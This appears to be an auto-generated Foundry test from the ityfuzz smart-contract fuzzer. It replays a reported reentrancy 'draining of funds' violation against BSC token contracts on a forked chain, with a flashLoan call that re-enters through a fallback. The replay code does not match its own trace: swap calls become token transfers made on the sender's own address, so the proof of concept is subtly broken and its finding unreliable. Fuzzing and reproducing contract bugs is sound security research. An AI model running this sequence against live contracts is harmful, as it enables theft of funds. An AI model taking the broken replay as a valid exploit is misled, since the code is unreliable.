// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// ityfuzz evm -o -t 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4,0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c,0x5DfC7f3EbBB9Cbfe89bc3FB70f750Ee229a59F8c -c bsc --onchain-block-number 23106506 -f -i -p --onchain-etherscan-api-key $BSC_ETHERSCAN_API_KEY
/*

😊😊 Found violations!


================ Description ================
[Reentrancy]: Reentrancy vulnerability detected on contract '0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c' at storage slot 10415307257034271136856486003238862001203579304718096273714522463662926732730. This could allow draining of funds.
[Reentrancy]: Reentrancy vulnerability detected on contract '0xe9e7cea3dedca5984780bafc599bd69add087d56' at storage slot 64639116632579767351258073319016321082121065746195416645933107587971626102358. This could allow draining of funds.
================ Trace ================
[Sender] 0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd
   ├─[1] Router.swapExactETHForTokens{value: 2408.3018 ether}(0, path:(WETH → 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56), address(this), block.timestamp);
   ├─[1] 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56.transfer(0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4, 7632)
   ├─[1] 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4.flashLoan(0, 128, 0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024, 0xa6a020000000fa0000fa)
   │  ├─[2] [Sender] 0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd.fallback()
   │  │  └─[3] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c.receive{value: 874.4849 ether}()
   └─[1] Router.swapExactETHForTokens{value: 2361.1832 ether}(0, path:(WETH → 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56), address(this), block.timestamp);


 */

contract C0fe2 is Test {
    function setUp() public {
        vm.createSelectFork("bsc", 23106506);
    }

    function test() public {
        vm.prank(0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd);
        IERC20(0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd).transfer(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56, 2408.3018 ether);
        vm.prank(0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd);
        IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56).transfer(0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4, 7632);
        vm.prank(0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd);
        I(0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4).flashLoan(0, 128, 0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024, hex"a6a020000000fa0000fa");
        vm.prank(0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd);
        IERC20(0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd).transfer(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56, 2361.1832 ether);
    }

    // Stepping with return
    receive() external payable {}
}

interface I {
    function flashLoan(uint256,uint256,address,bytes memory) external payable;
}

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function skim(address to) external;
    function sync() external;
}

interface IUniswapV2Router {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}
